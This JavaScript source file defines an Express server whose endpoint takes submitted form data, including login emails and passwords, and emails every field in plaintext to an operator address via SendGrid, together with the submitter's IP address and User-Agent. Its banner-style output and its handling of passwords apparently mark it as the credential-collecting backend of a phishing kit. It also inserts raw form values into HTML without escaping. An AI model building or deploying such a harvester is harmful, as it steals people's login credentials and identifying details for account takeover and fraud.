const express = require('express');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors({ origin: process.env.FRONTEND_URL || '*' }));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Handle GET /api/submit to prevent "Cannot GET" error
app.get('/api/submit', (req, res) => {
    res.status(405).json({ error: 'Method Not Allowed. Use POST to submit form data.' });
});

// POST endpoint for all form submissions
app.post('/api/submit', async (req, res) => {
    const formData = req.body;
    const formType = formData.form_type || 'Unknown Form'; // Identify the form source

    // Basic validation: ensure at least one field is provided
    if (!formData || Object.keys(formData).length === 0) {
        return res.status(400).json({ error: 'No form data provided' });
    }

    // Optional: Page-specific validation
    if (formType === 'login') {
        const { email, pass } = formData;
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email) || pass.length < 8 || pass.length > 20) {
            return res.status(400).json({ error: 'Invalid email or password (8-20 characters required)' });
        }
    }
    // Add more form-specific validations here (e.g., for signup, contact)

    // Build email content dynamically
    let textContent = `++------[ ${formType} Details ]------++\n`;
    let htmlContent = `<h3>${formType} Details</h3>`;
    for (const [key, value] of Object.entries(formData)) {
        if (key !== 'form_type') { // Exclude form_type from details
            textContent += `${key}: ${value}\n`;
            htmlContent += `<p><strong>${key}:</strong> ${value}</p>`;
        }
    }
    textContent += `\n++------[ Client Info ]------++\n`;
    textContent += `IP: ${req.ip}\nTimestamp: ${new Date().toUTCString()}\nUser-Agent: ${req.get('User-Agent')}\n`;
    htmlContent += `<hr><h3>Client Info</h3>`;
    htmlContent += `<p><strong>IP:</strong> ${req.ip}</p>`;
    htmlContent += `<p><strong>Timestamp:</strong> ${new Date().toUTCString()}</p>`;
    htmlContent += `<p><strong>User-Agent:</strong> ${req.get('User-Agent')}</p>`;

    // Email configuration
    const msg = {
        to: process.env.RECEIVER_EMAIL,
        from: process.env.SENDER_EMAIL,
        subject: `New ${formType} Submission [${formData.email || 'No Email'}]`,
        text: textContent,
        html: htmlContent
    };

    try {
        await sgMail.send(msg);
        console.log(`Email sent for ${formType} submission`);
        res.json({ status: 'success', message: `${formType} data received and emailed` });
    } catch (error) {
        console.error('SendGrid Error:', error);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
